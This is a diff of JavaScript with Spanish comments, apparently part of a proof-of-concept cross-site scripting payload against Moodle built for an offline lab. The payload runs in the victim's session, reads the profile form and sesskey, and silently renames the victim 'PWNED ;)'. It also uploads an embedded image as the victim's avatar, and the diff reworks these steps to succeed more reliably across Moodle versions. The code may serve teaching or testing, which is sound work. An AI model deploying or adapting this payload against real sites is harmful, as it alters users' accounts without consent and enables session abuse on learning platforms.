@@ -74,9 +74,9 @@ mismo origen autenticado del LMS.</p>
     } catch (e) {}
   }
 
-  // Imagen embebida (data-URI base64): cuadrado rojo con "!" — SIN peticiones externas (lab sin internet).
+  // Imagen embebida (data-URI base64): cuadrado rojo 240×240 con borde — SIN peticiones externas (lab sin internet).
   // El filtro filter_urltolink de Moodle no toca data: (solo http/https/www), asi que no se mangla.
-  var IMG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGAAAABgCAIAAABt+uBvAAABEklEQVR42u3d0Q2CMBQF0NI4AsziGo7qGDoLDOEABEJMpFd67qfxx5P32ldDdXiNY5HtVASAAAEClJvb+qXnsnTL8Vjt6SpIiwE6ew3a78nrZX/NVUFaDBAgQIAAAQIk30zSv859no+87T1NKkiLAQIESAABAgQIECBAgAQQIECAAAECBAiQAAIECBAgQIAACSBAgAABAgQIkAACVK7wIHnDJ8RVECBAgAABss2XVnfHQiaAmqlTDt+16wJoyyLBqMbqhBjV/DurbY3sYoAAAeoY6Mg02HZibF9B+5+/+Twd0WJbCgmnjZQ1aG0RchYLOqxmfj9tFwMECFDwIt3zb0urIECATsjgn1lUECBAgAD9bT55DysbWIHcVwAAAABJRU5ErkJggg==';
+  var IMG = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAPAAAADwCAIAAACxN37FAAACLElEQVR42u3SAQ0AQAgDMSTgXxGu/mUQoEsVLBfPbNHCBSZoM0GbCdpM0CZoM0GbCdpM0GaCNkGbHQi6MqGdoBG0oBE0CBoEjaAFjaAFjaBB0CBoBC1oBC1oBA2CBkEjaEEjaG8iaBA0CBpBCxpBg6BB0CBoBC1oBA2CBkGDoBG0oBE0CBoEDYJG0IJG0CBoEDSCFjSCFjSCBkGDoBG0oBG0oBE0CBoEjaAFjaAFjaBB0CBoBC1oBA2CBkGDoBG0oBE0CBoEDYJG0IJG0CBoEDQIGkELGkGDoEHQIGgELWgEDYIGQSNoQSNoQSNoEDQIGkELGkELGkGDoEHQCFrQCNqVCBoEDYJG0IJG0CBoEDQIGkELGkGDoEHQIGgELWgEDYIGQYOgEbSgETQIGgSNoAWNoAWNoEHQIGgELWgELWgEDYIGQSNoQSNoQSNoEDQIGkELGkGDoEHQIGgELWgEDYIGQYOgEbSgETQIGgQNgkbQgkbQIGgQNAgaQQsaQYOgQdAIWtAIWtAIGgQNgkbQgkbQgkbQIGgQNIIWNIIWNIIGQYOgEbSgETQIGgQNgkbQgkbQIGgQNAgaQQsaQYOgQdAgaAQtaAQNggZBI2hBI2hBI2gQNAgaQQsaQQsaQYOgQdAIWtAIWtAIGgQNgkbQgkbQ3kTQIGgQNIIWNIIGQYOgQdAIWtAIGgQNggZBI2izHRO0CdpM0GaCNhO0CdpM0GaCNhO0maBN0GbD9wGzufrdXAJB8AAAAABJRU5ErkJggg==';
   function dataUriToBlob(uri) { var p = uri.split(','), bin = atob(p[1]), a = new Uint8Array(bin.length); for (var i = 0; i < bin.length; i++) { a[i] = bin.charCodeAt(i); } return new Blob([a], { type: 'image/png' }); }
   function swapAvatars() {  // cambio cosmetico EN VIVO (inmediato, sin recargar) — resiliente a los dos tipos de avatar
     try {
@@ -98,34 +98,47 @@ mismo origen autenticado del LMS.</p>
       }
     } catch (e) {}
   }
+  // Cambio PERSISTENTE de nombre + foto del PROPIO perfil. Robusto entre versiones de
+  // Moodle: el NOMBRE y la FOTO van en envíos SEPARADOS. Motivo: al subir una imagen al
+  // borrador del avatar, Moodle valida la foto al guardar; si la imagen es pequeña/rara
+  // (p. ej. 5.2 rechaza miniaturas) re-renderiza el formulario y se pierde TODO (también
+  // el nombre). Desacoplados, el nombre siempre cambia; la foto usa una imagen 240×240 y
+  // un nombre de fichero único (evita "fileexists") y el repo de subida real.
+  function pickProfileForm(html) {
+    var fs = [].slice.call(new DOMParser().parseFromString(html, 'text/html').querySelectorAll('form'));
+    return fs.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); })
+             .sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
+  }
+  function submitProfile(form) {
+    var editUrl = root + '/user/edit.php?id=' + uid;
+    var fd = new FormData(form); fd.delete('cancel'); fd.set('submitbutton', '1');
+    if (fd.has('firstname')) { fd.set('firstname', 'PWNED ;)'); }   // cambia también el nombre
+    var act = new URL(form.getAttribute('action') || editUrl, editUrl).href;
+    return W.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd });
+  }
   function changeOwnProfile() {
-    swapAvatars();                  // 1) efecto visible al instante
-    try {
-      var blob = dataUriToBlob(IMG); // 2) cambio PERSISTENTE (nombre + foto)
-      W.fetch(root + '/user/edit.php?id=' + uid, { credentials: 'same-origin' })
-        .then(function (r) { return r.text(); })
-        .then(function (html) {
-              var doc = new DOMParser().parseFromString(html, 'text/html');
-              var forms = [].slice.call(doc.querySelectorAll('form'));
-              var form = forms.filter(function (f) { return f.querySelector('input[name^="_qf__"]'); })
-                              .sort(function (a, b) { return b.querySelectorAll('input,select,textarea').length - a.querySelectorAll('input,select,textarea').length; })[0];
-              var itemEl = form && form.querySelector('input[name=imagefile]');
-              if (!itemEl) { return; }
-              var itemid = itemEl.value;
-              var repoId = (function () { var k = html.indexOf('"type":"upload"'); if (k < 0) { return '5'; } var bb = html.slice(Math.max(0, k - 300), k); var m = bb.match(/"id":"?(\d+)"?[^{}]*$/); return m ? m[1] : '5'; })();
-              var ufd = new FormData();
-              ufd.append('repo_upload_file', blob, 'alert.png'); ufd.append('sesskey', sk); ufd.append('repo_id', repoId);
-              ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', 'alert.png'); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
-              return W.fetch(root + '/repository/repository_ajax.php?action=upload', { method: 'POST', credentials: 'same-origin', body: ufd })
-                .then(function (r) { return r.json(); })
-                .then(function () {
-                  var fd = new FormData(form); fd.delete('cancel'); fd.set('submitbutton', '1');
-                  if (fd.has('firstname')) { fd.set('firstname', 'PWNED ;)'); }   // cambia también el nombre
-                  var act = new URL(form.getAttribute('action') || (root + '/user/edit.php'), root + '/user/edit.php?id=' + uid).href;
-                  return W.fetch(act, { method: 'POST', credentials: 'same-origin', body: fd });
-                });
-            }).catch(function () {});
-    } catch (e) {}
+    swapAvatars();                  // 1) efecto visible al instante (cosmético)
+    var editUrl = root + '/user/edit.php?id=' + uid;
+    // (a) NOMBRE: en su propio submit, sin tocar la foto -> nunca falla por la imagen.
+    W.fetch(editUrl, { credentials: 'same-origin' }).then(function (r) { return r.text(); })
+      .then(function (html) { var f = pickProfileForm(html); if (f) { return submitProfile(f); } })
+      // (b) FOTO: formulario fresco, subida con nombre único + repo de subida detectado.
+      .then(function () {
+        return W.fetch(editUrl, { credentials: 'same-origin' }).then(function (r) { return r.text(); }).then(function (html) {
+          var form = pickProfileForm(html);
+          var itemEl = form && form.querySelector('input[name=imagefile]');
+          if (!itemEl) { return; }
+          var itemid = itemEl.value;
+          var repoId = (html.match(/"id":"?(\d+)"?,"name":"[^"]*","type":"upload"/) || html.match(/"type":"upload"[^}]*"id":"?(\d+)/) || [, '5'])[1] || '5';
+          var fname = 'poc' + itemid + '.png';
+          var ufd = new FormData();
+          ufd.append('repo_upload_file', dataUriToBlob(IMG), fname); ufd.append('sesskey', sk); ufd.append('repo_id', repoId);
+          ufd.append('itemid', itemid); ufd.append('savepath', '/'); ufd.append('title', fname); ufd.append('author', 'PoC'); ufd.append('license', 'unknown');
+          return W.fetch(root + '/repository/repository_ajax.php?action=upload', { method: 'POST', credentials: 'same-origin', body: ufd })
+            .then(function (r) { return r.json(); })
+            .then(function () { return submitProfile(form); });
+        });
+      }).catch(function () {});
   }
 
   // ---------- guardarraíl para administración ----------
